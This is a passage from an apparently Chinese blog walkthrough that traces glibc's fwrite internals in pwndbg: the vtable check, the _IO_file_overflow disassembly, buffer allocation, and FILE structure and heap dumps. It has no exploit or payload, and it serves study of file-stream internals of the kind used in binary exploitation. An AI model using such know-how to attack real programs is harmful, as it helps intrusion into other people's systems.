R12 =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c8b6b8 &lt;_IO_file_xsputn+184&gt;    sub    r12, r14                        R12 =&gt; 0xd68 (0x7ffff7e17768 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8b6bb &lt;_IO_file_xsputn+187&gt;    mov    rdx, rax                        RDX =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8b6be &lt;_IO_file_xsputn+190&gt;    sub    rdx, r14                        RDX =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8b6c1 &lt;_IO_file_xsputn+193&gt;    cmp    r12, rdx                        0xd68 - 0xc00     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b6c4 &lt;_IO_file_xsputn+196&gt;  ✘ jbe    _IO_file_xsputn+640         &lt;_IO_file_xsputn+640&gt;</span><br><span class="line"></span><br><span class="line">0x00007ffff7c8b880 &lt;+640&gt;:   mov    QWORD PTR [rsp],rax</span><br><span class="line">0x00007ffff7c8b884 &lt;+644&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br></pre></td></tr></table></figure><p>这里是<code>vtable</code>的安全检查，不再赘述，往下继续，调用<code>vtable-&gt;_IO_file_overflow</code>函数（<code>vtable</code>偏移0x18处）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b6ca &lt;_IO_file_xsputn+202&gt;    mov    esi, 0xffffffff     ESI =&gt; 0xffffffff</span><br><span class="line">0x7ffff7c8b6cf &lt;_IO_file_xsputn+207&gt;    mov    rdi, rbp            RDI =&gt; 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line">0x7ffff7c8b6d2 &lt;_IO_file_xsputn+210&gt;    call   qword ptr [rax + 0x18]      &lt;_IO_file_overflow&gt;</span><br></pre></td></tr></table></figure><p>先贴上其汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_file_overflow:</span><br><span class="line">=&gt; 0x00007ffff7c8cdc0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8cdc4 &lt;+4&gt;:     push   r12</span><br><span class="line">   0x00007ffff7c8cdc6 &lt;+6&gt;:     push   rbp</span><br><span class="line">   0x00007ffff7c8cdc7 &lt;+7&gt;:     mov    rbp,rdi</span><br><span class="line">   0x00007ffff7c8cdca &lt;+10&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8cdcb &lt;+11&gt;:    mov    eax,DWORD PTR [rdi]</span><br><span class="line">   0x00007ffff7c8cdcd &lt;+13&gt;:    test   al,0x8</span><br><span class="line">   0x00007ffff7c8cdcf &lt;+15&gt;:    jne    0x7ffff7c8cfc0 &lt;_IO_new_file_overflow+512&gt;</span><br><span class="line">   0x00007ffff7c8cdd5 &lt;+21&gt;:    mov    ebx,esi</span><br><span class="line">   0x00007ffff7c8cdd7 &lt;+23&gt;:    mov    rsi,QWORD PTR [rdi+0x20]</span><br><span class="line">   0x00007ffff7c8cddb &lt;+27&gt;:    test   ah,0x8</span><br><span class="line">   0x00007ffff7c8cdde &lt;+30&gt;:    je     0x7ffff7c8ce30 &lt;_IO_new_file_overflow+112&gt;</span><br><span class="line">   0x00007ffff7c8cde0 &lt;+32&gt;:    test   rsi,rsi</span><br><span class="line">   0x00007ffff7c8cde3 &lt;+35&gt;:    je     0x7ffff7c8cf58 &lt;_IO_new_file_overflow+408&gt;</span><br><span class="line">   0x00007ffff7c8cde9 &lt;+41&gt;:    mov    rdx,QWORD PTR [rdi+0x28]</span><br><span class="line">   0x00007ffff7c8cded &lt;+45&gt;:    cmp    ebx,0xffffffff</span><br><span class="line">   0x00007ffff7c8cdf0 &lt;+48&gt;:    je     0x7ffff7c8ce9c &lt;_IO_new_file_overflow+220&gt;</span><br><span class="line">   0x00007ffff7c8cdf6 &lt;+54&gt;:    cmp    QWORD PTR [rbp+0x40],rdx</span><br><span class="line">   0x00007ffff7c8cdfa &lt;+58&gt;:    je     0x7ffff7c8cee0 &lt;_IO_new_file_overflow+288&gt;</span><br><span class="line">   0x00007ffff7c8ce00 &lt;+64&gt;:    lea    rax,[rdx+0x1]</span><br><span class="line">   0x00007ffff7c8ce04 &lt;+68&gt;:    mov    QWORD PTR [rbp+0x28],rax</span><br><span class="line">   0x00007ffff7c8ce08 &lt;+72&gt;:    mov    BYTE PTR [rdx],bl</span><br><span class="line">   0x00007ffff7c8ce0a &lt;+74&gt;:    mov    eax,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c8ce0d &lt;+77&gt;:    test   al,0x2</span><br><span class="line">   0x00007ffff7c8ce0f &lt;+79&gt;:    jne    0x7ffff7c8ceb0 &lt;_IO_new_file_overflow+240&gt;</span><br><span class="line">   0x00007ffff7c8ce15 &lt;+85&gt;:    test   ah,0x2</span><br><span class="line">   0x00007ffff7c8ce18 &lt;+88&gt;:    je     0x7ffff7c8ce23 &lt;_IO_new_file_overflow+99&gt;</span><br><span class="line">   0x00007ffff7c8ce1a &lt;+90&gt;:    cmp    ebx,0xa</span><br><span class="line">   0x00007ffff7c8ce1d &lt;+93&gt;:    je     0x7ffff7c8ceb0 &lt;_IO_new_file_overflow+240&gt;</span><br><span class="line">   0x00007ffff7c8ce23 &lt;+99&gt;:    movzx  eax,bl</span><br><span class="line">   0x00007ffff7c8ce26 &lt;+102&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8ce27 &lt;+103&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8ce28 &lt;+104&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8ce2a &lt;+106&gt;:   ret</span><br><span class="line">   0x00007ffff7c8ce2b &lt;+107&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8ce30 &lt;+112&gt;:   test   rsi,rsi</span><br><span class="line">   0x00007ffff7c8ce33 &lt;+115&gt;:   je     0x7ffff7c8cf58 &lt;_IO_new_file_overflow+408&gt;</span><br><span class="line">   0x00007ffff7c8ce39 &lt;+121&gt;:   mov    rdx,QWORD PTR [rdi+0x8]</span><br><span class="line">   0x00007ffff7c8ce3d &lt;+125&gt;:   test   ah,0x1</span><br><span class="line">   0x00007ffff7c8ce40 &lt;+128&gt;:   jne    0x7ffff7c8cf80 &lt;_IO_new_file_overflow+448&gt;</span><br><span class="line">   0x00007ffff7c8ce46 &lt;+134&gt;:   mov    rsi,QWORD PTR [rbp+0x40]</span><br><span class="line">   0x00007ffff7c8ce4a &lt;+138&gt;:   cmp    rsi,rdx</span><br><span class="line">   0x00007ffff7c8ce4d &lt;+141&gt;:   je     0x7ffff7c8cf20 &lt;_IO_new_file_overflow+352&gt;</span><br><span class="line">   0x00007ffff7c8ce53 &lt;+147&gt;:   mov    rcx,QWORD PTR [rbp+0x10]</span><br><span class="line">   0x00007ffff7c8ce57 &lt;+151&gt;:   mov    QWORD PTR [rbp+0x8],rcx</span><br><span class="line">   0x00007ffff7c8ce5b &lt;+155&gt;:   mov    QWORD PTR [rbp+0x18],rcx</span><br><span class="line">   0x00007ffff7c8ce5f &lt;+159&gt;:   mov    ecx,eax</span><br><span class="line">   0x00007ffff7c8ce61 &lt;+161&gt;:   or     ch,0x8</span><br><span class="line">   0x00007ffff7c8ce64 &lt;+164&gt;:   mov    QWORD PTR [rbp+0x30],rsi</span><br><span class="line">   0x00007ffff7c8ce68 &lt;+168&gt;:   mov    rsi,rdx</span><br><span class="line">   0x00007ffff7c8ce6b &lt;+171&gt;:   mov    DWORD PTR [rbp+0x0],ecx</span><br><span class="line">   0x00007ffff7c8ce6e &lt;+174&gt;:   mov    ecx,DWORD PTR [rbp+0xc0]</span><br><span class="line">   0x00007ffff7c8ce74 &lt;+180&gt;:   mov    QWORD PTR [rbp+0x28],rdx</span><br><span class="line">   0x00007ffff7c8ce78 &lt;+184&gt;:   mov    QWORD PTR [rbp+0x20],rdx</span><br><span class="line">   0x00007ffff7c8ce7c &lt;+188&gt;:   test   ecx,ecx</span><br><span class="line">   0x00007ffff7c8ce7e &lt;+190&gt;:   jg     0x7ffff7c8cded &lt;_IO_new_file_overflow+45&gt;</span><br><span class="line">   0x00007ffff7c8ce84 &lt;+196&gt;:   test   eax,0x202</span><br><span class="line">   0x00007ffff7c8ce89 &lt;+201&gt;:   je     0x7ffff7c8cded &lt;_IO_new_file_overflow+45&gt;</span><br><span class="line">   0x00007ffff7c8ce8f &lt;+207&gt;:   mov    QWORD PTR [rbp+0x30],rdx</span><br><span class="line">   0x00007ffff7c8ce93 &lt;+211&gt;:   cmp    ebx,0xffffffff</span><br><span class="line">   0x00007ffff7c8ce96 &lt;+214&gt;:   jne    0x7ffff7c8cdf6 &lt;_IO_new_file_overflow+54&gt;</span><br><span class="line">   0x00007ffff7c8ce9c &lt;+220&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8ce9d &lt;+221&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8cea0 &lt;+224&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8cea3 &lt;+227&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8cea4 &lt;+228&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8cea6 &lt;+230&gt;:   jmp    0x7ffff7c8c930 &lt;_IO_new_do_write&gt;</span><br><span class="line">   0x00007ffff7c8ceab &lt;+235&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8ceb0 &lt;+240&gt;:   mov    rsi,QWORD PTR [rbp+0x20]</span><br><span class="line">   0x00007ffff7c8ceb4 &lt;+244&gt;:   mov    rdx,QWORD PTR [rbp+0x28]</span><br><span class="line">   0x00007ffff7c8ceb8 &lt;+248&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8cebb &lt;+251&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8cebe &lt;+254&gt;:   call   0x7ffff7c8c930 &lt;_IO_new_do_write&gt;</span><br><span class="line">   0x00007ffff7c8cec3 &lt;+259&gt;:   cmp    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cec6 &lt;+262&gt;:   jne    0x7ffff7c8ce23 &lt;_IO_new_file_overflow+99&gt;</span><br><span class="line">   0x00007ffff7c8cecc &lt;+268&gt;:   mov    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8ced1 &lt;+273&gt;:   jmp    0x7ffff7c8ce26 &lt;_IO_new_file_overflow+102&gt;</span><br><span class="line">   0x00007ffff7c8ced6 &lt;+278&gt;:   cs nop WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cee0 &lt;+288&gt;:   mov    eax,DWORD PTR [rbp+0xc0]</span><br><span class="line">   0x00007ffff7c8cee6 &lt;+294&gt;:   test   eax,eax</span><br><span class="line">   0x00007ffff7c8cee8 &lt;+296&gt;:   jle    0x7ffff7c8cf40 &lt;_IO_new_file_overflow+384&gt;</span><br><span class="line">   0x00007ffff7c8ceea &lt;+298&gt;:   mov    rax,QWORD PTR [rbp+0xa0]</span><br><span class="line">   0x00007ffff7c8cef1 &lt;+305&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8cef4 &lt;+308&gt;:   mov    rsi,QWORD PTR [rax+0x18]</span><br><span class="line">   0x00007ffff7c8cef8 &lt;+312&gt;:   mov    rdx,QWORD PTR [rax+0x20]</span><br><span class="line">   0x00007ffff7c8cefc &lt;+316&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8ceff &lt;+319&gt;:   sar    rdx,0x2</span><br><span class="line">   0x00007ffff7c8cf03 &lt;+323&gt;:   call   0x7ffff7c861a0 &lt;__GI__IO_wdo_write&gt;</span><br><span class="line">   0x00007ffff7c8cf08 &lt;+328&gt;:   cmp    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cf0b &lt;+331&gt;:   je     0x7ffff7c8cecc &lt;_IO_new_file_overflow+268&gt;</span><br><span class="line">   0x00007ffff7c8cf0d &lt;+333&gt;:   mov    rdx,QWORD PTR [rbp+0x28]</span><br><span class="line">   0x00007ffff7c8cf11 &lt;+337&gt;:   jmp    0x7ffff7c8ce00 &lt;_IO_new_file_overflow+64&gt;</span><br><span class="line">   0x00007ffff7c8cf16 &lt;+342&gt;:   cs nop WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cf20 &lt;+352&gt;:   mov    rdx,QWORD PTR [rbp+0x38]</span><br><span class="line">   0x00007ffff7c8cf24 &lt;+356&gt;:   movq   xmm0,rdx</span><br><span class="line">   0x00007ffff7c8cf29 &lt;+361&gt;:   mov    rcx,rdx</span><br><span class="line">   0x00007ffff7c8cf2c &lt;+364&gt;:   punpcklqdq xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8cf30 &lt;+368&gt;:   movups XMMWORD PTR [rbp+0x8],xmm0</span><br><span class="line">   0x00007ffff7c8cf34 &lt;+372&gt;:   jmp    0x7ffff7c8ce57 &lt;_IO_new_file_overflow+151&gt;</span><br><span class="line">   0x00007ffff7c8cf39 &lt;+377&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8cf40 &lt;+384&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8cf43 &lt;+387&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8cf46 &lt;+390&gt;:   call   0x7ffff7c8c930 &lt;_IO_new_do_write&gt;</span><br><span class="line">   0x00007ffff7c8cf4b &lt;+395&gt;:   cmp    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cf4e &lt;+398&gt;:   jne    0x7ffff7c8cf0d &lt;_IO_new_file_overflow+333&gt;</span><br><span class="line">   0x00007ffff7c8cf50 &lt;+400&gt;:   jmp    0x7ffff7c8cecc &lt;_IO_new_file_overflow+268&gt;</span><br><span class="line">   0x00007ffff7c8cf55 &lt;+405&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8cf58 &lt;+408&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8cf5b &lt;+411&gt;:   call   0x7ffff7c8dc90 &lt;__GI__IO_doallocbuf&gt;</span><br><span class="line">   0x00007ffff7c8cf60 &lt;+416&gt;:   mov    rdx,QWORD PTR [rbp+0x38]</span><br><span class="line">   0x00007ffff7c8cf64 &lt;+420&gt;:   mov    eax,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c8cf67 &lt;+423&gt;:   movq   xmm0,rdx</span><br><span class="line">   0x00007ffff7c8cf6c &lt;+428&gt;:   mov    QWORD PTR [rbp+0x18],rdx</span><br><span class="line">   0x00007ffff7c8cf70 &lt;+432&gt;:   punpcklqdq xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8cf74 &lt;+436&gt;:   movups XMMWORD PTR [rbp+0x8],xmm0</span><br><span class="line">   0x00007ffff7c8cf78 &lt;+440&gt;:   jmp    0x7ffff7c8ce3d &lt;_IO_new_file_overflow+125&gt;</span><br><span class="line">   0x00007ffff7c8cf7d &lt;+445&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8cf80 &lt;+448&gt;:   mov    r12,QWORD PTR [rbp+0x10]</span><br><span class="line">   0x00007ffff7c8cf84 &lt;+452&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8cf87 &lt;+455&gt;:   sub    r12,rdx</span><br><span class="line">   0x00007ffff7c8cf8a &lt;+458&gt;:   call   0x7ffff7c8d7c0 &lt;__GI__IO_free_backup_area&gt;</span><br><span class="line">   0x00007ffff7c8cf8f &lt;+463&gt;:   mov    rdx,QWORD PTR [rbp+0x18]</span><br><span class="line">   0x00007ffff7c8cf93 &lt;+467&gt;:   mov    rsi,r12</span><br><span class="line">   0x00007ffff7c8cf96 &lt;+470&gt;:   neg    rsi</span><br><span class="line">   0x00007ffff7c8cf99 &lt;+473&gt;:   mov    rcx,rdx</span><br><span class="line">   0x00007ffff7c8cf9c &lt;+476&gt;:   sub    rcx,QWORD PTR [rbp+0x38]</span><br><span class="line">   0x00007ffff7c8cfa0 &lt;+480&gt;:   mov    rax,rcx</span><br><span class="line">   0x00007ffff7c8cfa3 &lt;+483&gt;:   neg    rax</span><br><span class="line">   0x00007ffff7c8cfa6 &lt;+486&gt;:   cmp    rcx,r12</span><br><span class="line">   0x00007ffff7c8cfa9 &lt;+489&gt;:   cmova  rax,rsi</span><br><span class="line">   0x00007ffff7c8cfad &lt;+493&gt;:   add    rdx,rax</span><br><span class="line">   0x00007ffff7c8cfb0 &lt;+496&gt;:   mov    eax,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c8cfb3 &lt;+499&gt;:   jmp    0x7ffff7c8ce46 &lt;_IO_new_file_overflow+134&gt;</span><br><span class="line">   0x00007ffff7c8cfb8 &lt;+504&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cfc0 &lt;+512&gt;:   or     eax,0x20</span><br><span class="line">   0x00007ffff7c8cfc3 &lt;+515&gt;:   mov    DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c8cfc5 &lt;+517&gt;:   mov    rax,QWORD PTR [rip+0x18ce44]        # 0x7ffff7e19e10</span><br><span class="line">   0x00007ffff7c8cfcc &lt;+524&gt;:   mov    DWORD PTR fs:[rax],0x9</span><br><span class="line">   0x00007ffff7c8cfd3 &lt;+531&gt;:   mov    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cfd8 &lt;+536&gt;:   jmp    0x7ffff7c8ce26 &lt;_IO_new_file_overflow+102&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>回到调试<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8cdc0 &lt;_IO_file_overflow&gt;        endbr64</span><br><span class="line">0x7ffff7c8cdc4 &lt;_IO_file_overflow+4&gt;      push   r12</span><br><span class="line">0x7ffff7c8cdc6 &lt;_IO_file_overflow+6&gt;      push   rbp</span><br><span class="line">0x7ffff7c8cdc7 &lt;_IO_file_overflow+7&gt;      mov    rbp, rdi                 RBP =&gt; 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line">0x7ffff7c8cdca &lt;_IO_file_overflow+10&gt;     push   rbx</span><br><span class="line">0x7ffff7c8cdcb &lt;_IO_file_overflow+11&gt;     mov    eax, dword ptr [rdi]     EAX, [0x5555555592a0] =&gt; 0xfbad2488</span><br><span class="line">0x7ffff7c8cdcd &lt;_IO_file_overflow+13&gt;     test   al, 8                    0x88 &amp; 0x8     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8cdcf &lt;_IO_file_overflow+15&gt;   ✘ jne    _IO_file_overflow+512       &lt;_IO_file_overflow+512&gt;</span><br></pre></td></tr></table></figure><p>这里先保存栈帧，然后检查<code>_flags</code>，判断文件是否可写，（<del>笔者这里demo写的时候忘记改文件打开模式了，所以不可写，直接返回了，改一下后重新快进到这一步</del>）不可写则返回（<code>&lt;_IO_file_overflow+512&gt;</code>后续执行就返回了），可写则继续<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8cdd5 &lt;_IO_file_overflow+21&gt;     mov    ebx, esi                        EBX =&gt; 0xffffffff</span><br><span class="line">0x7ffff7c8cdd7 &lt;_IO_file_overflow+23&gt;     mov    rsi, qword ptr [rdi + 0x20]     RSI, [0x5555555592c0] =&gt; 0</span><br><span class="line">0x7ffff7c8cddb &lt;_IO_file_overflow+27&gt;     test   ah, 8                           0x24 &amp; 0x8     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8cdde &lt;_IO_file_overflow+30&gt;   ✔ je     _IO_file_overflow+112       &lt;_IO_file_overflow+112&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8ce30 &lt;_IO_file_overflow+112&gt;    test   rsi, rsi                        0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8ce33 &lt;_IO_file_overflow+115&gt;  ✔ je     _IO_file_overflow+408       &lt;_IO_file_overflow+408&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8cf58 &lt;_IO_file_overflow+408&gt;    mov    rdi, rbp                        RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c8cf5b &lt;_IO_file_overflow+411&gt;    call   _IO_doallocbuf              &lt;_IO_doallocbuf&gt;</span><br></pre></td></tr></table></figure><p>这里先判断<code>_flags</code>状态，还未准备好写入，然后判断<code>[rdi + 0x20]</code>即<code>_IO_write_base</code>是否为空，为空则调用<code>_IO_doallocbuf</code>来分配缓冲区<br>这里<code>_IO_doallocbuf</code>的流程在fread就分析过了，不再赘述，直接看返回后结构体的状态<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539004,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559470</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555594a0</span><br><span class="line">Size: 0x1010 (with flag bits: 0x1011)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555a4b0</span><br><span class="line">Size: 0x1fb50 (with flag bits: 0x1fb51)</span><br></pre></td></tr></table></figure><p>分配好了大小0x1000的chunk作为缓冲区，并设置好了<code>_IO_buf_base</code>和<code>_IO_buf_end</code>指针<br>然后设置了read三元组（<code>_IO_read_base</code>,<code>_IO_read_ptr</code>,<code>_IO_read_end</code>）为<code>_IO_buf_base</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8cf60 &lt;_IO_file_overflow+416&gt;    mov    rdx, qword ptr [rbp + 0x38]     RDX, [0x5555555592d8] =&gt; 0x5555555594b0 ◂— 0</span><br><span class="line">0x7ffff7c8cf64 &lt;_IO_file_overflow+420&gt;    mov    eax, 